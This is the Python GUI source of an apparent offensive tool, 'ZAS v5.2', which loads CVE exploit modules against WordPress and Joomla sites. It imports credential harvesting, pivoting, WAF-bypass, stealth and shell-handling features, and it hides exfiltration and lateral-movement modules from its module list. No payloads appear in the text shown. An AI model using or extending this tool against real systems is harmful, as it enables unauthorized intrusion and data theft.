#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZAS v5.2
"""

import os
import sys
import time
import shutil
import threading
import queue
import importlib.util
import urllib.request
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from datetime import datetime

if sys.platform == "win32":
    os.system("chcp 65001 >nul 2>&1")
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")

# Add core and exploits directories to path
_base = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(_base, "core"))
sys.path.insert(0, os.path.join(_base, "exploits"))

from core.gui_config import COLORS, get_base_dir, load_config, save_config, classify_exp
from core.gui_export import export_txt, export_json, export_csv, export_sarif, generate_html
from core.shell_tabs import ShellTabManager
from core.audit_log import audit_log

try:
    from zas_core import get_verify as _get_ssl_verify, set_ignore_ssl as _set_ignore_ssl
except ImportError:
    def _get_ssl_verify():
        return False
    def _set_ignore_ssl(ignore=True):
        pass

# Advanced features
sys.path.insert(0, os.path.join(_base, "lib"))
try:
    from zas_fingerprint import fingerprint_cms, fingerprint_technologies, generate_shodan_query
    from zas_waf import detect_waf, get_waf_bypass_techniques
    from zas_creds import parse_credential_output, format_creds_report, HARVEST_COMMANDS
    from zas_pivot import parse_pivot_output, generate_pivot_targets, format_pivot_report, PIVOT_COMMANDS
    from zas_stealth import StealthSession
    from zas_notify import NotificationManager
    HAS_ADVANCED = True
except ImportError:
    HAS_ADVANCED = False

# Autonomous mode — all modules loaded locally


def get_base_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


def load_exploits(exploits_dir):
    exploits = {}
    if not os.path.isdir(exploits_dir):
        return exploits

    exploits_abs = os.path.abspath(exploits_dir)
    if exploits_abs not in sys.path:
        sys.path.insert(0, exploits_abs)

    for fname in sorted(os.listdir(exploits_dir)):
        # Support both .py and .pyd (Cython compiled) files
        if fname.endswith(".pyd"):
            mod_name = fname.replace(".pyd", "")
            if mod_name.startswith("_") or mod_name in ("zas_core", "base", "registry", "zas_bypass"):
                continue
        elif fname.endswith(".py") and not fname.startswith("_"):
            mod_name = fname.replace(".py", "")
            if mod_name in ("zas_core", "base", "registry", "zas_bypass"):
                continue
        else:
            continue
        
        fpath = os.path.join(exploits_dir, fname)
        try:
            spec = importlib.util.spec_from_file_location(mod_name, fpath)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            if hasattr(mod, "info") and callable(mod.info):
                meta = mod.info()
                exploits[mod_name] = {
                    "module": mod,
                    "cve": meta.get("cve", mod_name),
                    "name": meta.get("name", ""),
                    "plugin": meta.get("plugin", ""),
                    "severity": meta.get("severity", ""),
                    "description": meta.get("description", ""),
                    "tags": meta.get("tags", []),
                }
        except Exception as e:
            print(f"[!] Failed to load {fname}: {e}")
    return exploits



def normalize_url(url):
    url = url.strip()
    if not url:
        return None
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    return url.rstrip("/")



class CollapsibleFrame(ttk.Frame):
    """Collapsible frame with expand/collapse toggle."""
    
    def __init__(self, parent, text="", expanded=True, **kwargs):
        super().__init__(parent, **kwargs)
        self.expanded = expanded
        self.text = text
        
        # Header frame with visible background
        self.header = tk.Frame(self, bg=COLORS["bg3"], cursor="hand2")
        self.header.pack(fill="x")
        self.header.bind("<Button-1>", lambda e: self.toggle())
        
        # Arrow indicator
        self.arrow = tk.Label(self.header, text="▼" if expanded else "▶", 
                              bg=COLORS["bg3"], fg=COLORS["accent"], 
                              font=("Consolas", 10, "bold"), width=2)
        self.arrow.pack(side="left", padx=(6, 2), pady=4)
        self.arrow.bind("<Button-1>", lambda e: self.toggle())
        
        # Title label
        self.title = tk.Label(self.header, text=text, 
                              bg=COLORS["bg3"], fg=COLORS["fg"], 
                              font=("Consolas", 9, "bold"))
        self.title.pack(side="left", padx=(0, 6), pady=4)
        self.title.bind("<Button-1>", lambda e: self.toggle())
        
        # Content frame
        self.content = ttk.Frame(self)
        if expanded:
            self.content.pack(fill="x", padx=4, pady=(2, 4))
    
    def toggle(self):
        """Toggle expand/collapse."""
        self.expanded = not self.expanded
        if self.expanded:
            self.content.pack(fill="x", padx=4, pady=(2, 4))
            self.arrow.configure(text="▼")
        else:
            self.content.pack_forget()
            self.arrow.configure(text="▶")


class Tooltip:
    def __init__(self, widget, text):
        self.widget = widget
        self.text = text
        self.tip = None
        widget.bind("<Enter>", self._show)
        widget.bind("<Leave>", self._hide)

    def _show(self, event=None):
        if not self.text:
            return
        x = self.widget.winfo_rootx() + 25
        y = self.widget.winfo_rooty() + 20
        self.tip = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(True)
        tw.wm_geometry(f"+{x}+{y}")
        tw.configure(bg=COLORS["border"])
        frame = tk.Frame(tw, bg=COLORS["bg2"], padx=8, pady=6, bd=1, relief="solid",
                         highlightbackground=COLORS["border"])
        frame.pack()
        label = tk.Label(frame, text=self.text, bg=COLORS["bg2"], fg=COLORS["fg"],
                         font=("Segoe UI", 9), wraplength=320, justify="left")
        label.pack()

    def _hide(self, event=None):
        if self.tip:
            self.tip.destroy()
            self.tip = None


class ZASApp:
    def __init__(self, root):
        self.root = root
        self.root.title("ZAS v5.2")
        self.root.geometry("1700x1000")
        self.root.minsize(1500, 900)
        self.root.configure(bg=COLORS["bg"])
        self.root.overrideredirect(True)
        self.root.geometry("1700x1000+10+5")

        self.base_dir = get_base_dir()
        self.exploits = {}
        
        exploits_dir = os.path.join(self.base_dir, "exploits")
        self.exploits = load_exploits(exploits_dir)
        print(f"[+] Loaded {len(self.exploits)} local modules")

        self.targets = []
        self.scanning = False
        self.paused = False
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.scan_thread = None
        self.log_queue = queue.Queue()
        self.results_data = []
        self.results_lock = threading.Lock()
        self.module_vars = {}
        self.scan_completed = False
        self._notif_manager = None

        self._build_ui()
        self._load_config()
        self._bind_hotkeys()
        self._process_log_queue()

    def _bind_hotkeys(self):
        self.root.bind("<F5>", lambda e: self._start_scan())
        self.root.bind("<F6>", lambda e: self._toggle_pause())
        self.root.bind("<F7>", lambda e: self._stop_scan())
        self.root.bind("<Control-s>", lambda e: self._save_log())
        self.root.bind("<Control-o>", lambda e: self._load_file())
        self.root.bind("<Escape>", lambda e: self._close())

    def _build_ui(self):
        s = ttk.Style()
        s.theme_use("clam")
        s.configure(".", background=COLORS["bg"], foreground=COLORS["fg"],
                    fieldbackground=COLORS["bg2"], borderwidth=0)
        s.configure("TFrame", background=COLORS["bg"])
        s.configure("TLabel", background=COLORS["bg"], foreground=COLORS["fg"])
        s.configure("TButton", background=COLORS["bg3"], foreground=COLORS["fg"], padding=4)
        s.map("TButton", background=[("active", COLORS["accent"])])
        s.configure("TCheckbutton", background=COLORS["bg"], foreground=COLORS["fg"])
        s.map("TCheckbutton", background=[("active", COLORS["bg"])])
        s.configure("TLabelframe", background=COLORS["bg"], foreground=COLORS["accent"])
        s.configure("TLabelframe.Label", background=COLORS["bg"], foreground=COLORS["accent"],
                    font=("Consolas", 9, "bold"))
        s.configure("Accent.Horizontal.TProgressbar", background=COLORS["accent"], troughcolor=COLORS["bg3"])
        s.configure("Nav.TButton", background=COLORS["bg3"], foreground=COLORS["fg"],
                    padding=(10, 8), font=("Consolas", 9), anchor="w")
        s.map("Nav.TButton",
              background=[("active", COLORS["bg4"]), ("selected", COLORS["bg4"])],
              foreground=[("active", COLORS["accent"]), ("selected", COLORS["accent"])])

        # ── Title bar ──
        title_bar = tk.Frame(self.root, bg=COLORS["bg4"], height=32)
        title_bar.bind("<Button-1>", self._start_drag)
        title_bar.bind("<B1-Motion>", self._do_drag)
        title_bar.pack(fill="x")
        title_bar.pack_propagate(False)

        tk.Label(title_bar, text="⚡ ZAS v5.2", font=("Consolas", 11, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg4"]).pack(side="left", padx=12)
        btn_frame = tk.Frame(title_bar, bg=COLORS["bg4"])
        btn_frame.pack(side="right", padx=8)
        for txt, cmd in [("─", self._minimize), ("□", self._maximize), ("✕", self._close)]:
            btn = tk.Label(btn_frame, text=txt, font=("Consolas", 11),
                           fg=COLORS["fg2"], bg=COLORS["bg4"], cursor="hand2", padx=6)
            btn.pack(side="left")
            btn.bind("<Button-1>", cmd)
        tk.Frame(self.root, height=2, bg=COLORS["accent"]).pack(fill="x")

        # ── Top toolbar (grouped, consistent metrics) ──
        toolbar = tk.Frame(self.root, bg=COLORS["bg4"], height=52)
        toolbar.pack(fill="x")
        toolbar.pack_propagate(False)

        def _sep():
            tk.Frame(toolbar, width=1, bg=COLORS["border"]).pack(side="left", fill="y", padx=10, pady=8)

        def _flat_btn(parent, text, command, bg=COLORS["bg3"], fg=COLORS["fg"],
                      width=8, font=("Consolas", 9, "bold"), state="normal", padx=10):
            return tk.Button(parent, text=text, command=command, width=width, font=font,
                             bg=bg, fg=fg, activebackground=bg, activeforeground=fg,
                             relief="flat", cursor="hand2", state=state, padx=padx, pady=6)

        # Group: Target
        tg = tk.Frame(toolbar, bg=COLORS["bg4"])
        tg.pack(side="left", padx=(12, 0), pady=6)
        tk.Label(tg, text="Target", font=("Consolas", 8, "bold"),
                 fg=COLORS["fg2"], bg=COLORS["bg4"]).pack(side="left", padx=(0, 4))
        self.target_entry = tk.Entry(tg, font=("Consolas", 10), width=26,
                                     bg=COLORS["bg2"], fg=COLORS["fg"],
                                     insertbackground=COLORS["accent"], relief="flat")
        self.target_entry.pack(side="left", padx=(0, 4))
        self.target_entry.insert(0, "http://target.com")
        self.target_entry.bind("<FocusIn>", lambda e: self.target_entry.delete(0, "end")
                               if self.target_entry.get().startswith("http://target") else None)
        self.target_entry.bind("<Return>", lambda e: self._add_target())
        _flat_btn(tg, "＋", self._add_target, bg=COLORS["accent"], fg=COLORS["primaryFg"], width=2, padx=8).pack(side="left", padx=1)
        _flat_btn(tg, "📁", self._load_file, width=2, padx=8).pack(side="left", padx=1)
        _flat_btn(tg, "🕘", self._show_target_history, width=2, padx=8).pack(side="left", padx=1)
        self.target_count = tk.Label(tg, text="0", font=("Consolas", 8),
                                     fg=COLORS["fg2"], bg=COLORS["bg4"], width=3)
        self.target_count.pack(side="left", padx=(6, 0))

        _sep()

        # Group: Mode
        mode_box = tk.Frame(toolbar, bg=COLORS["bg4"])
        mode_box.pack(side="left", pady=6)
        self.mode_var = tk.StringVar(value="exploit")
        seg = tk.Frame(mode_box, bg=COLORS["bg3"])
        seg.pack(side="left")
        self._mode_buttons = {}
        b = tk.Radiobutton(seg, text="Exploit", variable=self.mode_var, value="exploit",
                           indicatoron=False, width=8, pady=5,
                           bg=COLORS["bg3"], fg=COLORS["fg2"], selectcolor=COLORS["bg2"],
                           activebackground=COLORS["bg2"], activeforeground=COLORS["accent"],
                           font=("Consolas", 9, "bold"))
        b.pack(side="left", padx=0)
        self._mode_buttons["exploit"] = b

        _sep()

        # Group: Controls (same height / weight)
        ctrl_box = tk.Frame(toolbar, bg=COLORS["bg4"])
        ctrl_box.pack(side="left", pady=6)
        self.start_btn = _flat_btn(ctrl_box, "▶  START", self._start_scan,
                                   bg=COLORS["accent"], fg=COLORS["primaryFg"],
                                   width=10, font=("Consolas", 10, "bold"))
        self.start_btn.pack(side="left", padx=3)
        self.pause_btn = _flat_btn(ctrl_box, "⏸  PAUSE", self._toggle_pause,
                                   bg="#c9a227", fg="#1a1a00",
                                   width=10, font=("Consolas", 10, "bold"), state="disabled")
        self.pause_btn.pack(side="left", padx=3)
        self.stop_btn = _flat_btn(ctrl_box, "⏹  STOP", self._stop_scan,
                                  bg="#c62828", fg="#ffffff",
                                  width=10, font=("Consolas", 10, "bold"), state="disabled")
        self.stop_btn.pack(side="left", padx=3)

        _sep()

        # Group: numeric settings (uniform field width)
        settings_box = tk.Frame(toolbar, bg=COLORS["bg4"])
        settings_box.pack(side="left", pady=6)
        for label, var_name, default, width in [
            ("Threads", "threads_var", "10", 4),
            ("Timeout", "timeout_var", "15", 4),
            ("Jitter", "jitter_var", "0.3-2.0", 8),
            ("Delay", "delay_var", "0", 4),
        ]:
            field = tk.Frame(settings_box, bg=COLORS["bg4"])
            field.pack(side="left", padx=(0, 10))
            tk.Label(field, text=label, font=("Consolas", 8),
                     fg=COLORS["fg2"], bg=COLORS["bg4"]).pack(side="left", padx=(0, 3))
            var = tk.StringVar(value=default)
            setattr(self, var_name, var)
            tk.Entry(field, textvariable=var, width=width, font=("Consolas", 9),
                     bg=COLORS["bg2"], fg=COLORS["fg"], relief="flat",
                     justify="center").pack(side="left")

        _sep()

        # Group: checkboxes (next to settings, not floating far right)
        flags = tk.Frame(toolbar, bg=COLORS["bg4"])
        flags.pack(side="left", pady=6)
        self.skip_validation_var = tk.BooleanVar(value=False)
        tk.Checkbutton(flags, text="Skip validation", variable=self.skip_validation_var,
                       bg=COLORS["bg4"], fg=COLORS["fg2"], selectcolor=COLORS["bg3"],
                       activebackground=COLORS["bg4"], activeforeground=COLORS["fg"],
                       font=("Consolas", 8), anchor="w").pack(side="left", padx=(0, 12))
        self.ignore_ssl_var = tk.BooleanVar(value=True)
        tk.Checkbutton(flags, text="Ignore SSL", variable=self.ignore_ssl_var,
                       bg=COLORS["bg4"], fg=COLORS["fg2"], selectcolor=COLORS["bg3"],
                       activebackground=COLORS["bg4"], activeforeground=COLORS["fg"],
                       font=("Consolas", 8), anchor="w").pack(side="left")

        # ── Body: nav | main | right ──
        body = tk.Frame(self.root, bg=COLORS["bg"])
        body.pack(fill="both", expand=True)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(0, weight=1)

        # Left nav
        nav = tk.Frame(body, bg=COLORS["bg4"], width=220)
        nav.grid(row=0, column=0, sticky="nsw")
        nav.grid_propagate(False)
        tk.Label(nav, text="NAVIGATION", font=("Consolas", 7, "bold"),
                 fg=COLORS["fg3"], bg=COLORS["bg4"], anchor="w").pack(fill="x", padx=12, pady=(10, 4))

        self._nav_buttons = {}
        self._nav_items = [
            ("modules", "▦  Modules", self._module_count_label),
            ("exploit", "⚡  Exploit", None),
            ("advanced", "🔧  Advanced", None),
            ("shodan", "🔍  Shodan", None),
            ("notify", "🔔  Notify", None),
            ("shells", "🖥  Shells", None),
        ]
        for key, label, _ in self._nav_items:
            b = tk.Button(nav, text=label, font=("Consolas", 9), anchor="w",
                          bg=COLORS["bg4"], fg=COLORS["fg"], activebackground=COLORS["bg3"],
                          activeforeground=COLORS["accent"], relief="flat", bd=0, pady=8,
                          command=lambda k=key: self._show_panel(k))
            b.pack(fill="x", padx=6, pady=1)
            self._nav_buttons[key] = b

        tk.Frame(nav, height=1, bg=COLORS["border"]).pack(fill="x", padx=10, pady=8)
        self._nav_badge = tk.Label(nav, text="0 selected", font=("Consolas", 9, "bold"),
                                   fg=COLORS["accent"], bg=COLORS["bg4"], anchor="w")
        self._nav_badge.pack(fill="x", padx=12, pady=4)

        # Main content (switchable)
        main = tk.Frame(body, bg=COLORS["bg"])
        main.grid(row=0, column=1, sticky="nsew", padx=4, pady=4)
        self._panels = {}

        self._panels["modules"] = tk.Frame(main, bg=COLORS["bg"])
        self._panels["exploit"] = tk.Frame(main, bg=COLORS["bg"])
        self._panels["advanced"] = tk.Frame(main, bg=COLORS["bg"])
        self._panels["shodan"] = tk.Frame(main, bg=COLORS["bg"])
        self._panels["notify"] = tk.Frame(main, bg=COLORS["bg"])
        self._panels["shells"] = tk.Frame(main, bg=COLORS["bg"])

        self._build_panel_modules(self._panels["modules"])
        self._build_panel_exploit(self._panels["exploit"])
        self._build_panel_advanced(self._panels["advanced"])
        self._build_panel_shodan(self._panels["shodan"])
        self._build_panel_notify(self._panels["notify"])
        self._build_panel_shells(self._panels["shells"])

        # Right panel: Output only (always visible)
        self.right_panel = tk.Frame(body, bg=COLORS["bg"], width=360)
        self.right_panel.grid(row=0, column=2, sticky="nse", padx=(0, 4), pady=4)
        self.right_panel.grid_propagate(False)
        self.right_panel.rowconfigure(1, weight=1)
        self.right_panel.columnconfigure(0, weight=1)

        right_header = tk.Frame(self.right_panel, bg=COLORS["bg4"])
        right_header.grid(row=0, column=0, sticky="ew")
        tk.Label(right_header, text="Output", font=("Consolas", 9, "bold"),
                 fg=COLORS["accent"], bg=COLORS["bg4"]).pack(side="left", padx=8, pady=6)

        self.right_body = tk.Frame(self.right_panel, bg=COLORS["bg"])
        self.right_body.grid(row=1, column=0, sticky="nsew")
        self.right_body.rowconfigure(0, weight=1)
        self.right_body.columnconfigure(0, weight=1)
        self._build_output(self.right_body)

        self._show_panel("modules")
        self._build_status()

    def _show_panel(self, key):
        for name, frame in self._panels.items():
            frame.pack_forget()
        self._panels[key].pack(fill="both", expand=True)
        for name, btn in self._nav_buttons.items():
            if name == key:
                btn.configure(bg=COLORS["bg3"], fg=COLORS["accent"])
            else:
                btn.configure(bg=COLORS["bg4"], fg=COLORS["fg"])
        if key == "shells":
            self._update_shells_nav_badge()

    def _show_target_history(self):
        hist_path = os.path.join(self.base_dir, "reports", "targets_history.txt")
        try:
            if os.path.exists(hist_path):
                self._load_file_from(hist_path)
            else:
                self.log("[*] No target history yet", "info")
        except Exception as e:
            self.log(f"[!] History: {e}", "error")

    def _load_file_from(self, path):
        with open(path, encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        for line in lines:
            if line not in self.targets:
                self.targets.append(line)
        self._update_target_count()
        self.log(f"[+] Loaded {len(lines)} target(s) from history", "success")

    def _module_count_label(self):
        return ""

    def _update_nav_badge(self):
        try:
            n = sum(1 for v in self.module_vars.values() if v.get())
            total = len(self.module_vars)
            self._nav_badge.configure(text=f"{n}/{total} selected")
        except Exception:
            pass

    def _build_panel_modules(self, parent):
        self.module_vars = {}
        self._mod_sort_col = "cve"
        self._mod_sort_desc = False
        self._filter_state = {"crit": False, "high": False, "wordpress": False,
                              "joomla": False, "other": False, "selected_only": False}

        # ── toolbar ──
        tools = tk.Frame(parent, bg=COLORS["bg4"])
        tools.pack(fill="x", pady=(0, 4))

        tk.Label(tools, text="🔍", font=("Segoe UI", 10), bg=COLORS["bg4"],
                 fg=COLORS["fg2"]).pack(side="left", padx=(6, 2))
        self._mod_search_var = tk.StringVar()
        self._mod_search_var.trace_add("write", lambda *a: self._on_search_change())
        search = tk.Entry(tools, textvariable=self._mod_search_var, width=28,
                          font=("Consolas", 9), bg=COLORS["bg2"], fg=COLORS["fg"],
                          insertbackground=COLORS["accent"], relief="flat")
        search.pack(side="left", padx=(0, 8))
        Tooltip(search, "Поиск по CVE, названию, описанию…")

        self._filter_buttons = {}
        self._filter_chip_colors = {
            "crit": COLORS["red"],
            "high": COLORS["orange"],
            "wordpress": COLORS["blue"],
            "joomla": COLORS["purple"],
            "other": COLORS["cyan"],
            "selected_only": COLORS["accent"],
        }
        for key, label in [("crit", "CRIT"), ("high", "HIGH"), ("wordpress", "WordPress"),
                           ("joomla", "Joomla"), ("other", "Other"), ("selected_only", "Только выбранные")]:
            b = tk.Button(tools, text=label, font=("Consolas", 8, "bold"), relief="flat",
                          bg=COLORS["bg3"], fg=COLORS["fg2"], activebackground=COLORS["bg3"],
                          activeforeground=COLORS["accent"], padx=8, pady=3, bd=0,
                          command=lambda k=key: self._toggle_filter(k))
            b.pack(side="left", padx=2, pady=3)
            self._filter_buttons[key] = b

        self._reset_btn = tk.Button(tools, text="Сбросить фильтры", font=("Consolas", 8, "bold"),
                                    relief="flat", bg=COLORS["bg3"], fg=COLORS["fg3"],
                                    command=self._reset_filters, padx=8, pady=3)
        self._reset_btn.pack(side="left", padx=6, pady=3)

        self._selected_label = tk.Label(tools, text="Выбрано: 0", font=("Consolas", 10, "bold"),
                                        bg=COLORS["bg4"], fg=COLORS["accent"])
        self._selected_label.pack(side="right", padx=(4, 8))
        for txt, cmd in [("All", self._select_all), ("None", self._deselect_all),
                         ("Invert", self._invert_selection)]:
            tk.Button(tools, text=txt, font=("Consolas", 8), bg=COLORS["bg3"], fg=COLORS["fg"],
                      relief="flat", command=cmd, padx=8, pady=2).pack(side="right", padx=2)

        # ── header + table ──
        table_wrap = tk.Frame(parent, bg=COLORS["bg"])
        table_wrap.pack(fill="both", expand=True)
        table_wrap.rowconfigure(1, weight=1)
        table_wrap.columnconfigure(0, weight=1)

        header = tk.Frame(table_wrap, bg=COLORS["bg4"], height=32)
        header.grid(row=0, column=0, sticky="ew")
        header.grid_propagate(False)
        self._col_widths = {"sel": 48, "cve": 160, "severity": 96, "cms": 110, "desc": 420, "info": 48}

        def _hdr(key, text, sort_key):
            cell = tk.Frame(header, bg=COLORS["bg4"])
            cell.pack(side="left", fill="y")
            cell.configure(width=self._col_widths[key])
            cell.pack_propagate(False)
            lbl = tk.Label(cell, text=text, font=("Consolas", 9, "bold"),
                           fg=COLORS["accent"], bg=COLORS["bg4"], anchor="w", padx=6)
            lbl.pack(fill="both", expand=True)
            lbl.bind("<Button-1>", lambda e, k=sort_key: self._sort_modules(k))
            lbl.configure(cursor="hand2")

        _hdr("sel", "✓", "sel")
        _hdr("cve", "CVE ⇅", "cve")
        _hdr("severity", "Severity ⇅", "severity")
        _hdr("cms", "CMS ⇅", "cms")
        _hdr("desc", "Описание", "desc")
        _hdr("info", "Info", "info")

        body = tk.Frame(table_wrap, bg=COLORS["bg"])
        body.grid(row=1, column=0, sticky="nsew")
        body.rowconfigure(0, weight=1)
        body.columnconfigure(0, weight=1)

        self.mod_canvas = tk.Canvas(body, bg=COLORS["bg2"], highlightthickness=0)
        vsb = ttk.Scrollbar(body, orient="vertical", command=self.mod_canvas.yview)
        self.mod_canvas.configure(yscrollcommand=vsb.set)
        self.mod_canvas.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")

        self._rows_container = tk.Frame(self.mod_canvas, bg=COLORS["bg2"])
        self._rows_win = self.mod_canvas.create_window((0, 0), window=self._rows_container, anchor="nw")
        self._rows_container.bind(
            "<Configure>",
            lambda e: self.mod_canvas.configure(scrollregion=self.mod_canvas.bbox("all")))
        self.mod_canvas.bind(
            "<Configure>",
            lambda e: self.mod_canvas.itemconfig(self._rows_win, width=e.width))

        def _on_wheel(event):
            self.mod_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

        self.mod_canvas.bind("<Enter>", lambda e: self.mod_canvas.bind_all("<MouseWheel>", _on_wheel))
        self.mod_canvas.bind("<Leave>", lambda e: self.mod_canvas.unbind_all("<MouseWheel>"))

        # ── footer ──
        foot = tk.Frame(parent, bg=COLORS["bg"])
        foot.pack(fill="x", pady=(6, 0))
        self._table_info = tk.Label(foot, text="Показано 0 из 0", font=("Consolas", 9, "bold"),
                                    bg=COLORS["bg"], fg=COLORS["fg2"])
        self._table_info.pack(side="left", padx=4)
        self._empty_label = tk.Label(foot, text="", font=("Segoe UI", 9, "italic"),
                                     bg=COLORS["bg"], fg=COLORS["yellow"])
        self._empty_label.pack(side="left", padx=12)

        # ── details overlay ──
        self._details_frame = tk.Frame(parent, bg=COLORS["bg3"], width=400)
        self._details_visible = False

        self._build_module_rows()
        self._refresh_modules_table()

    def _on_search_change(self):
        self._update_reset_btn()
        self._refresh_modules_table()

    def _build_module_rows(self):
        self._module_rows = []
        _hidden_cves = {"POST-001", "LAT-001", "EXFIL-001", "AUDIT-001"}
        for name, exp in sorted(self.exploits.items()):
            if exp.get("cve") in _hidden_cves:
                continue
            var = tk.BooleanVar(value=True)
            self.module_vars[name] = var
            cms = self._classify_exp(exp)
            sev = (exp.get("severity") or "low").lower()
            desc = (exp.get("description") or exp.get("name") or "").replace("\n", " ")
            self._module_rows.append({
                "name": name,
                "cve": exp.get("cve", name),
                "severity": sev,
                "cms": cms,
                "desc": desc,
                "title": exp.get("name", name),
                "tags": exp.get("tags", []),
                "var": var,
            })

    def _toggle_filter(self, key):
        self._filter_state[key] = not self._filter_state[key]
        b = self._filter_buttons[key]
        accent = self._filter_chip_colors.get(key, COLORS["accent"])
        if self._filter_state[key]:
            b.configure(bg=accent, fg="#ffffff" if key != "high" else "#1a1a00",
                        relief="solid", bd=2, highlightthickness=2,
                        highlightbackground="#ffffff", highlightcolor="#ffffff")
        else:
            b.configure(bg=COLORS["bg3"], fg=COLORS["fg2"], relief="flat", bd=0, highlightthickness=0)
        self._update_reset_btn()
        self._refresh_modules_table()

    def _update_reset_btn(self):
        active = any(self._filter_state.values()) or bool((self._mod_search_var.get() or "").strip())
        if active:
            self._reset_btn.configure(bg=COLORS["red"], fg="#ffffff", font=("Consolas", 8, "bold"))
        else:
            self._reset_btn.configure(bg=COLORS["bg3"], fg=COLORS["fg3"], font=("Consolas", 8))

    def _reset_filters(self):
        for key in self._filter_state:
            self._filter_state[key] = False
            self._filter_buttons[key].configure(bg=COLORS["bg3"], fg=COLORS["fg3"], relief="flat", bd=0)
        self._mod_search_var.set("")
        self._update_reset_btn()
        self._refresh_modules_table()

    def _invert_selection(self):
        for row in self._module_rows:
            row["var"].set(not row["var"].get())
        self._refresh_modules_table()
        self._update_settings_state()

    def _toggle_sort_sel(self):
        # toggle select-all for visible rows
        visible = self._filtered_rows()
        if all(r["var"].get() for r in visible):
            for r in visible:
                r["var"].set(False)
        else:
            for r in visible:
                r["var"].set(True)
        self._refresh_modules_table()
        self._update_settings_state()

    def _filtered_rows(self):
        q = (self._mod_search_var.get() or "").strip().lower()
        st = self._filter_state
        out = []
        for r in self._module_rows:
            if st["crit"] and r["severity"] != "critical":
                continue
            if st["high"] and r["severity"] != "high":
                continue
            if st["wordpress"] and r["cms"] != "wordpress":
                continue
            if st["joomla"] and r["cms"] != "joomla":
                continue
            if st["other"] and r["cms"] != "other":
                continue
            if st["selected_only"] and not r["var"].get():
                continue
            if q:
                blob = f"{r['cve']} {r['title']} {r['desc']} {r['cms']}".lower()
                if q not in blob:
                    continue
            out.append(r)
        return out

    def _sort_modules(self, col):
        if self._mod_sort_col == col:
            self._mod_sort_desc = not self._mod_sort_desc
        else:
            self._mod_sort_col = col
            self._mod_sort_desc = False
        self._refresh_modules_table()

    def _refresh_modules_table(self):
        if not hasattr(self, "_rows_container"):
            return
        for child in self._rows_container.winfo_children():
            child.destroy()
        self._row_widgets = {}

        rows = self._filtered_rows()
        sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        col = self._mod_sort_col
        if col == "severity":
            rows = sorted(rows, key=lambda r: sev_rank.get(r["severity"], 9),
                          reverse=self._mod_sort_desc)
        elif col in ("cve", "cms", "desc"):
            rows = sorted(rows, key=lambda r: str(r.get(col, "")).lower(),
                          reverse=self._mod_sort_desc)

        sev_style = {
            "critical": ("CRIT", "#c62828", "#ffffff"),
            "high": ("HIGH", "#ef6c00", "#1a1a00"),
            "medium": ("MED", "#f9a825", "#1a1a00"),
            "low": ("LOW", "#1565c0", "#ffffff"),
            "info": ("INFO", "#546e7a", "#ffffff"),
        }
        cms_label = {"wordpress": "WordPress", "joomla": "Joomla", "other": "Other"}

        if not rows:
            self._empty_label.configure(text="Ничего не найдено")
        else:
            self._empty_label.configure(text="")

        for r in rows:
            selected = r["var"].get()
            bg = "#1a2e1a" if selected else COLORS["bg2"]
            row = tk.Frame(self._rows_container, bg=bg, height=34, highlightthickness=1,
                           highlightbackground=COLORS["accent"] if selected else COLORS["border"])
            row.pack(fill="x", padx=1, pady=1)
            row.pack_propagate(False)

            cb = tk.Checkbutton(row, variable=r["var"], bg=bg, activebackground=bg,
                                selectcolor=COLORS["bg3"], highlightthickness=0,
                                command=self._on_module_toggle, bd=0)
            cb.pack(side="left", padx=(8, 4), fill="y")
            cb.configure(font=("Segoe UI", 11))

            tk.Label(row, text=r["cve"], font=("Consolas", 9, "bold"),
                     fg=COLORS["fg"], bg=bg, width=18, anchor="w").pack(side="left", padx=4)

            text, sbg, sfg = sev_style.get(r["severity"], ("INFO", "#546e7a", "#ffffff"))
            badge = tk.Label(row, text=f" {text} ", font=("Consolas", 8, "bold"),
                             bg=sbg, fg=sfg, padx=8, pady=2, width=6)
            badge.pack(side="left", padx=8)

            tk.Label(row, text=cms_label.get(r["cms"], r["cms"]), font=("Segoe UI", 9),
                     fg=COLORS["cyan"], bg=bg, width=10, anchor="w").pack(side="left", padx=6)

            short = r["desc"][:72] + ("…" if len(r["desc"]) > 72 else "")
            desc_lbl = tk.Label(row, text=short, font=("Segoe UI", 9),
                                fg=COLORS["fg"], bg=bg, anchor="w")
            desc_lbl.pack(side="left", fill="x", expand=True, padx=6)
            Tooltip(desc_lbl, f"{r['title']}\n\n{r['desc']}")

            info_btn = tk.Label(row, text=" ?", font=("Segoe UI", 11, "bold"),
                                bg=COLORS["bg3"], fg=COLORS["accent"], padx=8, pady=3,
                                cursor="hand2", relief="solid", bd=1, width=3)
            info_btn.pack(side="right", padx=8)
            info_btn.bind("<Button-1>", lambda e, n=r["name"]: self._show_module_details(n))
            Tooltip(info_btn, "Детали модуля")

            row.bind("<Button-1>", lambda e, n=r["name"]: self._toggle_row(n))
            for w in (desc_lbl, badge):
                w.bind("<Button-1>", lambda e, n=r["name"]: self._toggle_row(n))
                w.bind("<Double-1>", lambda e, n=r["name"]: self._show_module_details(n))

            self._row_widgets[r["name"]] = row

        self._table_info.configure(text=f"Показано {len(rows)} из {len(self._module_rows)}")
        n = sum(1 for x in self._module_rows if x["var"].get())
        self._selected_label.configure(text=f"Выбрано: {n}")
        self._nav_badge.configure(text=f"{n}/{len(self.module_vars)} selected")
        self._update_nav_badge()
        self._update_reset_btn()

    def _toggle_row(self, name):
        r = next((x for x in self._module_rows if x["name"] == name), None)
        if r:
            r["var"].set(not r["var"].get())
            self._on_module_toggle()

    def _show_module_details(self, name):
        r = next((x for x in self._module_rows if x["name"] == name), None)
        if not r:
            return
        for child in self._details_frame.winfo_children():
            child.destroy()
